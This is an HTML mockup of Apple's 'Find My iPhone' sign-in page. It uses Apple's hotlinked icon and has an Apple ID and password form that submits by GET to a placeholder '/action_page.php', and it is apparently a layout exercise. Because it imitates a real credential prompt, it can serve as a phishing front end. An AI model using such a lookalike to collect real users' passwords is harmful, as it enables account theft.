<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Find My iPhone</title>
    <link rel="stylesheet" type="text/css" href="index.css">
</head>
<body>
    <div id="wrapper">
        <header>
            <img src="https://support.apple.com/content/dam/edam/applecare/images/en_US/icloud/featured-content-findmyiphone-icon_2x.png" height="135px" width="135px">
            <h1>Find My iPhone</h1>
        </header>
        <div id="credentials">
            <form action="/action_page.php" method="get">
                <div class="borderForSignin">
                    <label for="AppleID">Apple ID</label>
                    <input type="text" name="AppleID" id="AppleID"><br>
                </div>
                <div>
                    <label for="password">Password</label>
                    <input type="password" name="password" id="password"><br>
                </div>
            </form>
        </div>
        <footer>
            <a id="signIn">Sign in...</a>
            <a id="recovery">Forget your Apple ID or password?</a>
            <a id="setup">Setup Instructions</a>
        </footer>
    </div>
</body>
</html>
